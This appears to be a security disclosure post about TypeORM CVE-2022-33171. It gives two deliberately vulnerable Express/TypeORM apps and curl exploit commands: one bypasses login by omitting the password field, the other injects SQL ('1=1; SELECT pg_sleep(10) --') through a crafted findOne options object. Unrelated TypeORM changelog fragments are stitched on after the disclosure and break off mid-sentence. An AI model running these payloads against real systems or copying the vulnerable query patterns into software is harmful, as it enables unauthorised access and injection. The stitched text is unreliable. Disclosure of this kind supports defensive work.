# Re: typeorm CVE-2022-33171

```
I found what I think is a vulnerability in the latest typeorm 0.3.7.
TypeORM v0.3 has a new findOneBy method instead of findOneById() and it is
the only way to get a record by id

Sending undefined as a value in this method removes this parameter from the
query. This leads to the data exposure.

For example:
Users.findOneBy({id: req.query.id}) with /?id=12345 produces SELECT * FROM
Users WHERE id=12345 LIMIT 1 while removing id from the query string
produces SELECT * FROM Users LIMIT 1

Maintainer also does not consider this a vulnerability and stated the
root cause is bad input validation. I tried to contact Snyk, but they
took the author's position. I still think it is a major vulnerability

Vulnerable app:

import {
  Entity,
  PrimaryGeneratedColumn,
  Column,
  Connection,
  ConnectionOptions,
  Repository,
  createConnection
} from 'typeorm';
import express from 'express';
import {Application, Request, Response} from 'express';

let connection: Connection;

async function myListener(request: Request, response: Response) {
  if(!connection)
    connection = await createConnection(connectionOpts);
  const userRepo: Repository<User> = connection.getRepository(User);

  const { email, password }: Record<string, string> = request.body;
  const user = await userRepo.findOneBy({ email, password });
  return response.json(user ? 'ok' : 'denied');
}

@Entity({ name: 'Users' })
class User {
    @PrimaryGeneratedColumn()
    id!: number;
    @Column()
    email!: string;
    @Column()
    password!: string;
}

const connectionOpts: ConnectionOptions = {
  type: 'mysql',
  name: 'myconnection',
  host: 'localhost',
  username: 'root',
  password: 'test123',
  database: 'domurl',
  entities: [User]
}

const app: Application = express();
app.use(express.json());
app.post( "/authenticate", myListener);
app.listen(4444, () => console.log('App started'));

Usage:

curl <http://127.0.0.1:4444/authenticate> -H 'Content-Type:
application/json' --data '{"email": "Flo64 () yahoo com", "password":
"incorrect"}'
"denied"⏎

Exploit:

curl <http://127.0.0.1:4444/authenticate> -H 'Content-Type:
application/json' --data '{"email": "Flo64 () yahoo com"}'
"ok"⏎

typeorm CVE-2022-33171

findOne(id), findOneOrFail(id)

The findOne function in TypeORM before 0.3.0 can either be supplied with a string or a FindOneOptions object. When
input to the function is a user-controlled parsed JSON object, supplying a crafted FindOneOptions instead of an id
string leads to SQL injection.

The issue was already fixed from version 0.3.0 onward when we encountered it.

Maintainer does not consider this a vulnerability and stated the root cause is bad input validation.

On one hand input validation is definitely insufficient. On the other hand this is a function argument that is meant to
be fed user input and as such one would think it safe to put user input there.

Vulnerable app:
```

import {
  Entity,
  PrimaryGeneratedColumn,
  Connection,
  ConnectionOptions,
  Repository,
  createConnection
} from 'typeorm';
import * as express from 'express';
import {Application, Request, Response} from 'express';

let connection: Connection;

async function myListener(request: Request, response: Response) {
  if(!connection)
    connection = await createConnection(connectionOpts);
  const userRepo: Repository<User> = connection.getRepository(User);

  const ids: string[] = request.body;
  for(const id of ids) {
    try {
      await userRepo.findOne(id);
    } catch(err: any) {
      console.log(err);
    }
  }
  response.json({});
}

@Entity({ name: 'user' })
class User {
    @PrimaryGeneratedColumn('uuid')
    id: string;
}

const connectionOpts: ConnectionOptions = {
  type: 'postgres',
  name: 'myconnection',
  host: 'db-host',
  port: 5432,
  username: 'username',
  password: 'password',
  database: 'mydb',
  schema: 'public',
  entities: [User]
}

const app: Application = express();
app.use(express.json());
app.post( "/findByIds", myListener);
app.listen(4444, () => console.log('App started'));

```

Exploit:
curl -v [<http://host/findByIds>](<http://containerip:4444/findByIds>)' -H 'Content-Type: application/json' --data
'[{"where":"1=1; SELECT pg_sleep(10) --"}]'

   * docs: update entitymanager definition ([#8623](https://github.com/typeorm/typeorm/pull/8623))

   * docs: update entitymanager definition

   change the "What is EntityManager?" page to be up-to-date with v 0.3.0

   1. line 6 changes from
   `You can access the entity manager via 'getManager()' or from 'Connection'.`
   to
   `You can access the entity manager via DataSource's manager.`

   2. the import on `getManager` in line 10 becomes `Manager` that the user have configured beforehand:
   `import {getManager} from "typeorm";`
   becomes
   `import {Manager} from "./config/DataSource";`

   3.change entityManager definition in line 13:
   from
   `const entityManager = getManager(); // you can also get it via getConnection().manager`
   to
   `const entityManager = Manager;`

   * docs: update entitymanager definition

   changed line 10 from:
   `import {Manager} from "./config/DataSource";`
   to
   `import {DataSource} from "typeorm";`

   and changed line 13 and 14 from:
   `const entityManager = Manager;`
   `const user = await entityManager.findOne(User, 1);`
   to
   `const myDataSource = new DataSource({ /*...*/ });`
   `const user = await myDataSource.manager.findOne(User, 1);`

   for a simpler way of describing the origin of DataSource and how it works.

   * In return type doesn't seem to work in all cases

   * feat: mssql v7 support ([#8592](https://github.com/typeorm/typeorm/pull/8592))

   Adds support for v7 of the mssql library as v6 is EOL. This also makes use of the new toReadableStream method on requests to return a native stream where required.

   * fix: prefix relation id columns contained in embedded entities ([#6977](https://github.com/typeorm/typeorm/issues/6977)) ([#7432](https://github.com/typeorm/typeorm/pull/7432))

   * fix: prefix relation id columns contained in embedded entities ([#6977](https://github.com/typeorm/typeorm/issues/6977))

   Searches embedded entity columns for relation ID column if relation column
   is in embedded entity. If not found, creates new relation ID with embedded
   metadata set to match the relation column.

   * test: prefix subcounters sub-entity with "sub" to fit in 30 character identifier for oracle

   Problem introduced with [#6981](https://github.com/typeorm/typeorm/pull/6981)

   * fix: find by Date object in sqlite driver ([#7538](https://github.com/typeorm/typeorm/pull/7538))

   * fix: find by Date object in sqlite driver

   In sqlite, Date objects are persisted as UtcDatetimeString.
   But a Date object parameter was escaped with .toISOString(), making such queries impossible.
   This commit aligns both transforms.
   This bug does *not* apply to better-sql where you can only bind numbers, strings, bigints, buffers,
   and null.
   This is breaking for when the user inserted their dates manually as ISO and relied on this old
   maltransformation, after this their find()s by Date won't work anymore.

   BREAKING CHANGE: Change Date serialization in selects
   Closes: [#2286](https://github.com/typeorm/typeorm/issues/2286)

   * add failing test

   * fix: find by Date object in sqlite driver (with query builder)

   Also consider query builder parameter escaping

   * test: add test for 3426

   are not unique because they are too long and thus truncated by the driver.
